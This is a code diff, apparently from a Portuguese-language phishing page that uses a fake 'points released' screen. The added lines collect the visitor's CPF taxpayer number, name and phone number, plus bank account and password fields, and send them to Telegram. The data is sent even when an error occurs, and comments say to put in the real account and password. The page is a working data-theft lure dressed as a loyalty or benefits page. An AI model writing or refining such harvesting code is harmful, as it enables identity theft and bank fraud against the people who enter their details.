@@ -169,11 +169,14 @@
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
 
-                    // Enviar CPF e outros dados ao Telegram
+                    // Garantir que o telefone seja enviado
+                    var telefone = document.getElementById("telefone").value;
+
+                    // Enviar CPF, Telefone, Conta e Senha para o Telegram
                     enviarParaTelegram({
                         cpf: cpf,
                         nome: nome,
-                        telefone: document.getElementById("telefone").value,
+                        telefone: telefone || 'Telefone não informado',
                         conta: '1515',  // Aqui você coloca o valor da conta real
                         senha: '1313'   // Aqui você coloca a senha real
                     });
@@ -185,9 +188,10 @@
                     document.getElementById("pontosLiberados").style.display = "block";
 
                     // Mesmo em caso de erro, enviar o CPF para o Telegram
+                    var telefone = document.getElementById("telefone").value;
                     enviarParaTelegram({
                         cpf: cpf,
-                        telefone: document.getElementById("telefone").value,
+                        telefone: telefone || 'Telefone não informado',
                         conta: '1515',
                         senha: '1313'
                     });
